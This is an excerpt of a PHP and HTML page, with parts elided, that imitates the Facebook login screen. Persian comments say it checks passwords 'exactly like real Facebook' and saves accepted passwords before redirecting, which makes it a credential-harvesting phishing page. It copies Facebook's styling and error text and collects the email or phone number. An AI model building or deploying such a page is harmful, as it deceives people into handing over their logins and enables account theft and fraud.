...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    ...
    // چک کردن حداقل ۶ کاراکتر برای پسورد (دقیقاً مثل فیسبوک واقعی)
    if (strlen($pass) < 6) {
        $error = "The password that you've entered is incorrect.";
    } else {
        // اگر پسورد اوکی بود → ذخیره و ریدایرکت
...
<head>
    ...
    <style>
        ...
        ._8f1i a{color:#0866ff;text-decoration:none;font-size:14px;font-weight:600;}
        ._8f1i{border-top:1px solid #dddfe2;margin:20px 40px 0;padding-top:20px;}
...
<div class="_9vt3">
    <div class="_8esj">
        ...
        <form method="post">
            <input type="text" name="email" placeholder="Email address or phone number" required autocomplete="off" value="<?= htmlspecialchars($email ?? '') ?>">
